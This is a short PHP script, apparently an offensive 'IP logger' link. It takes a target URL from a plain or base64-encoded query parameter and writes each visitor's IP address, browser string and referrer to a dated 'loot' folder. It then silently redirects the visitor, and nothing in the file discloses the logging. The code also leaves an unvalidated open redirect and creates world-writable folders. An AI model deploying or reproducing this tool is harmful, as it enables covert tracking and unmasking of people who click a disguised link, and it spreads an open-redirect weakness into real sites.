<?php
/// IP Logger PHP File
/// A function that checks if a folder exist, if not create it.
function CheckFolder($folder)
{
    if (!file_exists($folder)) {
        mkdir($folder, 0777, true);
    }
}

$pillagefolder = "loot/";

$date = date("Y-m-d");

$logfolder = $pillagefolder . $date . "/webEndpoints/";

$url = $_GET["url"];
if (empty($url)) $url = base64_decode($_GET["urlb"]);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$site_refer = $_SERVER['HTTP_REFERER'];
$realip = $_SERVER['REMOTE_ADDR'];

CheckFolder($logfolder);

$log = "------------------ Request\r\nIP: $realip\r\nBrowser: $useragent\r\nFrom: $site_refer\r\nTo: $url\r\n";

try {
    $logfile = $logfolder . "/logged.txt";
    $fh = fopen($logfile, 'a') or die("Can't create file");
    fwrite($fh, $log);
    fclose($fh);
} catch (Exception $e) {

}

header("Location: $url");
die();
?>
<html>

</html>